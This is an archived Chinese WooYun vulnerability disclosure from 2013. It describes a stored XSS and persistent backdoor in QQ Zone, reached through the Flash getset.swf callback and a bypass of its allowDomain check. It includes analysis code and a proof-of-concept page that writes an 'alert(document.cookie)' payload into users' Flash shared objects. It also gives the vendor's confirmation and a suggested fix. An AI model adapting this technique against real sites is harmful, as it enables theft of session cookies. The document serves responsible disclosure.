@@ -1,0 +1,281 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ空间存储XSS (以及持久后门)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ空间存储XSS (以及持久后门)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/neobyte">neobyte</a> 
+</li><li>提交时间：		2013-10-17 20:54</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-17：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-18：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-10-28：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-07：	细节向普通白帽子公开<br/>
+									2013-11-17：	细节向实习白帽子公开<br/>
+									2013-12-01：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">QQ空间存储XSS (以及持久后门)</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">一. 背景<br />
+<br />
+（本来我前面有个漏洞已经分析过，但还未公开，为了腾讯的工作人员确认方便，再描述一遍）<br />
+<br />
+关于flash的XSS,除了常见的一些技巧外,目前已知的比较偏门的两类是:<br />
+<br />
+1.ExternalInterface.call的第二个参数,主要利用\&quot;,catch(e){}//,wooyun上有很多例子<br />
+<br />
+2.在IE下,当flash调用ExternalInterface.addCallback时,如果object的id可控，可造成xss.这个比较少见，但gainover,p.z，心伤的瘦子几位大牛都给出过实例。<br />
+<br />
+<br />
+<br />
+但需要注意的是:当js调用flash暴露出来的callback时,返回值也是一个敏感点!这个并没有看到有人提及,也许被很多人忽视了.<br />
+<br />
+<br />
+<br />
+首先来看看js是如何处理flash的callback的:<br />
+<br />
+1.在ie下,其实是<br />
+<br />
+</p><pre><code>eval(instance.CallFunction(&quot;&lt;invoke name=\&quot;&quot;+name+&quot;\&quot; returntype=\&quot;javascript\&quot;&gt;&quot; + __flash__argumentsToXML(arguments,0) + &quot;&lt;/invoke&gt;&quot;));</code></pre><p class='detail'><br />
+<br />
+2.在FF与Chrome等其他浏览器下,其实是<br />
+<br />
+</p><pre><code>eval(var __flash_temp = &quot;returned value&quot;; __flash_temp;)</code></pre><p class='detail'><br />
+<br />
+注意到这里都调用了eval,再结合ExternalInterface.call的那个\&quot;过滤不全的利用方法, 这个利用方式也就呼之欲出了. <br />
+<br />
+所以只要js中调用了callback函数,而返回值又可被攻击者控制的话,就可以造成xss. IE, Chrome, FF等浏览器均受影响。注意：仅仅读取这个动作就会触发XSS，与读取后如何处置无关。<br />
+<br />
+而这个知识点再结合Flash的Local Shared Object，就有了一个固定的利用套路：如果网站通过js调用了flash添加的回调函数get(xxx)，从而读取保存着用户LSO中的数据时，只要这个LSO数据可被攻击者篡改，就可以造成XSS。<br />
+<br />
+<br />
+<br />
+二.环境与分析<br />
+<br />
+<br />
+<br />
+访问用户qq空间时，会自动加载一个getset.swf<br />
+<br />
+</p><pre><code>http://qzs.qq.com/qzone/v5/toolpages/getset.swf</code></pre><p class='detail'><br />
+<br />
+然后会调用这个flash的callback函数get，来读取一些保存在LSO中配置，读取时所使用的key如下：<br />
+<br />
+匿名用户访问某空间首页：_widhot_first_clickTime0<br />
+<br />
+登陆用户访问某空间首页：_widhot_first_clickTime+登陆的qq号<br />
+<br />
+登陆用户访问某空间日志：blogfont, hidesign, searchOption等<br />
+<br />
+<br />
+<br />
+这个getset.swf的关键代码如下：<br />
+<br />
+</p><pre><code>var my_so = SharedObject.getLocal(&quot;qzone&quot;);<br />
+    function _set(n, v) {<br />
+        my_so.data[n] = v;<br />
+    }<br />
+    function _get(n) {<br />
+        return(my_so.data[n]);<br />
+    }    <br />
+    function _interface() {<br />
+        var _local2 = flash.external.ExternalInterface.call(&quot;getShareObjectPrefix&quot;);<br />
+        System.security.allowDomain(&quot;user.qzone.qq.com&quot;);<br />
+        System.security.allowDomain(&quot;imgcache.qq.com&quot;);<br />
+        System.security.allowDomain(&quot;qzml.qq.com&quot;);<br />
+        System.security.allowDomain(_local2 + &quot;.qzone.qq.com&quot;);<br />
+        flash.external.ExternalInterface.addCallback(&quot;set&quot;, this, _set);<br />
+        flash.external.ExternalInterface.addCallback(&quot;get&quot;, this, _get);<br />
+}</code></pre><p class='detail'><br />
+<br />
+可见通过get读取，通过set写入。到此未知，我们似乎已经找到了一种攻击的办法，只要我们在一个流量较大的网页内，引入这个getset.swf，通过set函数来修改访问者电脑里的LSO数据，当访问者将来访问QQ空间时，就触发XSS（当然在网吧直接物理修改文件也是可行的）。<br />
+<br />
+但远程攻击还有一个重要的拦路虎：domainA的网页要调用domainB的flash的callback函数，需要flash中调用allowDomain（*）或者allowDomain（domainA)来授权。而这里这个flash只授权了qzone.qq.com等一系列的domain，除非我们能找到这些domain上的存储XSS。（这里同样也是一个提升存储XSS持久性与影响范围的利用技巧，同样因为Callback的机制）<br />
+<br />
+但请注意这行代码：<br />
+<br />
+</p><pre><code>var _local2 = flash.external.ExternalInterface.call(&quot;getShareObjectPrefix&quot;);<br />
+System.security.allowDomain(_local2 + &quot;.qzone.qq.com&quot;);</code></pre><p class='detail'><br />
+<br />
+domainA的网页加载domainB的Flash后，Flash会调用domainA页面内的getShareObjectPrefix函数（这个是受allowScriptAccess控制的）,如果此时domainA页面里的这个函数返回一个domainA+&#039;/&#039;，那么回到Flash，就变成了<br />
+<br />
+</p><pre><code>System.security.allowDomain(&quot;domainA/.qzone.qq.com&quot;);</code></pre><p class='detail'><br />
+<br />
+这个斜线就屏蔽了后面的qzone.qq.com，从而domainA也被授权调用该Flash的callback函数。<br />
+<br />
+<br />
+<br />
+三.POC<br />
+<br />
+<br />
+<br />
+这里给出简单的POC（渣代码见谅），这里domainA就是127.0.0.1，而domainB是qzs.qq.com，需要在127.0.0.1下访问该页面，需要等待5秒，弹出OK后，本地LSO才被修改完毕。（当然127.0.0.1也可以修改为其他domain）<br />
+<br />
+这个POC仅仅修改了匿名用户访问空间首页时自动读取的LSO key，以及登陆用户访问空间后查看日志时自动读取的一个LSO key。由于QQ空间可能还有很多其他读取LSO的key，所以整体上应该有很多触发点，当然有些key是定向的，有些key是通用的。<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+<br />
+&lt;object id=&quot;getset&quot; tabindex=&quot;-1&quot; classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot; width=&quot;1&quot; height=&quot;1&quot; codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab&quot;&gt;<br />
+       &lt;param name=&quot;movie&quot; value=&quot;http://qzs.qq.com/qzone/v5/toolpages/getset.swf&quot;&gt;<br />
+       &lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;&gt;<br />
+       &lt;embed name=&quot;getset&quot; src=&quot;http://qzs.qq.com/qzone/v5/toolpages/getset.swf&quot; width=&quot;1&quot; height=&quot;1&quot; allowscriptaccess=&quot;always&quot; flashvars=&quot;jsproxyfunction=test&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.adobe.com/go/getflashplayer&quot;&gt;<br />
+&lt;/object&gt;<br />
+&lt;script&gt;<br />
+function getShareObjectPrefix(){<br />
+	return &quot;127.0.0.1/&quot;;<br />
+}<br />
+setTimeout(&#039;myset()&#039;, 5000);<br />
+function myset(){<br />
+document[&#039;getset&#039;].set(&#039;_widhot_first_clickTime0&#039;,&#039;aa\\&quot;;alert(document.cookie)//aa&#039;);<br />
+document[&#039;getset&#039;].set(&#039;blogfont&#039;,&#039;aa\\&quot;;alert(document.cookie)//aa&#039;);<br />
+document[&#039;getset&#039;].flush();<br />
+alert(&#039;ok&#039;);<br />
+}<br />
+&lt;/script&gt;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/17202923579fe897ea9586cf0781101d60a508d9.png" target="_blank"><img src="../images/17202923579fe897ea9586cf0781101d60a508d9.png" alt="qzone.PNG" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">考虑到远程与物理两种篡改LSO的方式，allowDomain与callback的返回值可能都得检查。<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/neobyte" title="neobyte">neobyte</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-040108" title="QQ空间存储XSS (以及持久后门)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-10-18 15:44</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="40108";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
